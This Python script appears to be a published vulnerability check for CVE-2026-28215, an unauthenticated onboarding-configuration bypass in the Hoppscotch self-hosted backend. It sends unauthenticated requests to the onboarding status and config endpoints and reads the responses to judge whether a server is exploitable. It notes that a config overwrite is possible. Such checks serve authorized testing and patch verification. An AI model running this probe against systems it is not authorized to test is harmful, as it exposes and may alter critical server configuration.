#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Hoppscotch Onboarding Bypass — Non-destructive Check
# CVE            : CVE-2026-28215
# Vendor         : Hoppscotch
# Product        : Hoppscotch Self-Hosted Backend
# Affected       : < 2026.2.0
# Type           : CWE-284 - Improper Access Control
# CVSS           : 9.1 (Critical)
# Platform       : Node.js / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-28215: Non-destructive Vulnerability Check

Checks if a Hoppscotch instance is vulnerable to CVE-2026-28215 WITHOUT
modifying any configuration. Safe for scanning.

ATTACK CHAIN:
  1. GET /v1/onboarding/status — check if instance is Hoppscotch
  2. POST /v1/onboarding/config with minimal payload — test auth bypass
  3. Differentiate validation error (vulnerable) from auth rejection (patched)

PREREQUISITES:
  - Network access to Hoppscotch backend API
  - Python 3.6+ (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2026-28215
  - https://github.com/hoppscotch/hoppscotch/security/advisories/GHSA-jwv8-867r-q9fg
"""
import sys
import json
import http.client


RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

DEFAULT_PORT = 3170


def http_request(host, port, method, path, body=None, headers=None, timeout=10):
    """Send an HTTP request."""
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        if headers is None:
            headers = {}
        if body and isinstance(body, dict):
            body = json.dumps(body)
            headers["Content-Type"] = "application/json"
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", errors="replace")
        return resp.status, dict(resp.getheaders()), data
    except Exception as e:
        return None, None, str(e)
    finally:
        conn.close()


def check(target_host, target_port):
    """Non-destructive vulnerability check."""
    print(f"""
{BOLD}{CYAN}╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-28215 — Non-destructive Vulnerability Check      ║
║  Checks Hoppscotch onboarding endpoint accessibility       ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    print(f"{BOLD}Target: {target_host}:{target_port}{RESET}")
    print(f"{'═' * 60}")

    # ── Check 1: Onboarding status is accessible without auth ──
    print(f"\n{YELLOW}[*] Check 1: GET /v1/onboarding/status (unauthenticated)...{RESET}")
    status, headers, body = http_request(target_host, target_port, "GET", "/v1/onboarding/status")

    if status is None:
        print(f"{RED}[!] Connection failed: {body}{RESET}")
        print(f"\n{BOLD}Result: UNKNOWN (target unreachable){RESET}")
        return False

    if status != 200:
        print(f"{YELLOW}[*] Status endpoint returned {status} — may not be Hoppscotch.{RESET}")
        print(f"\n{BOLD}Result: NOT VULNERABLE or NOT HOPPSCOTCH{RESET}")
        return False

    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        print(f"{RED}[!] Non-JSON response — not a Hoppscotch instance.{RESET}")
        return False

    onboarding_completed = data.get("onboardingCompleted")
    can_rerun = data.get("canReRunOnboarding")

    if onboarding_completed is None:
        print(f"{YELLOW}[*] Response does not contain expected fields — not Hoppscotch.{RESET}")
        return False

    print(f"{GREEN}[+] Hoppscotch instance detected!{RESET}")
    print(f"    onboardingCompleted: {onboarding_completed}")
    print(f"    canReRunOnboarding:  {can_rerun}")

    # ── Check 2: Attempt POST with invalid body to test auth ──
    print(f"\n{YELLOW}[*] Check 2: POST /v1/onboarding/config with minimal body (testing auth)...{RESET}")
    # Send a deliberately minimal/invalid payload to see if we get auth error vs validation error
    # A patched version with users would return 400 "onboarding/cannot_be_rerun"
    # An unpatched version will return 400 validation error (no auth check)
    # Either way, NO config is overwritten because the payload is intentionally invalid
    test_payload = {
        "VITE_ALLOWED_AUTH_PROVIDERS": "EMAIL",
        # Missing required SMTP fields when EMAIL auth is specified
        # This will fail validation AFTER the auth check (or lack thereof)
    }

    status2, _, body2 = http_request(target_host, target_port, "POST", "/v1/onboarding/config", body=test_payload)

    if status2 is None:
        print(f"{RED}[!] Connection failed on POST check.{RESET}")
        return False

    print(f"    Response Status: {status2}")
    print(f"    Response Body: {body2[:200]}")

    # Analyze the response
    # 400 with "cannot_be_rerun" = PATCHED
    # 400 with validation error = VULNERABLE (got past auth, failed on input validation)
    # 201 = VULNERABLE and config was overwritten (shouldn't happen with our minimal payload but possible)
    # 401/403 = Has additional auth (non-standard setup)

    if status2 == 400:
        try:
            err = json.loads(body2)
            msg = err.get("message", "")
            if "cannot_be_rerun" in msg.lower() or "ONBOARDING_CANNOT_BE_RERUN" in msg:
                print(f"\n{GREEN}{BOLD}[+] PATCHED — Server blocked onboarding re-run.{RESET}")
                print(f"    Message: {msg}")
                return False
            else:
                # Validation error — means request got past auth (no auth check)
                print(f"\n{RED}{BOLD}[!] LIKELY VULNERABLE — Request reached validation stage (no auth check).{RESET}")
                print(f"    The 400 is a validation error, NOT an auth rejection.")
                print(f"    A full exploit payload would succeed.")
                return True
        except json.JSONDecodeError:
            pass

    if status2 == 201:
        print(f"\n{RED}{BOLD}[!!!] VULNERABLE — Config was overwritten even with minimal payload!{RESET}")
        return True

    if status2 in (401, 403):
        print(f"\n{GREEN}[+] Endpoint requires authentication — non-standard or patched.{RESET}")
        return False

    print(f"\n{YELLOW}[*] Unexpected response — manual verification recommended.{RESET}")
    return False


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    try:
        result = check(target, port)
        if result:
            print(f"\n{RED}{BOLD}RESULT: VULNERABLE to CVE-2026-28215{RESET}")
        else:
            print(f"\n{GREEN}{BOLD}RESULT: Not vulnerable or not applicable{RESET}")
        sys.exit(0 if result else 1)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Interrupted.{RESET}")
        sys.exit(130)
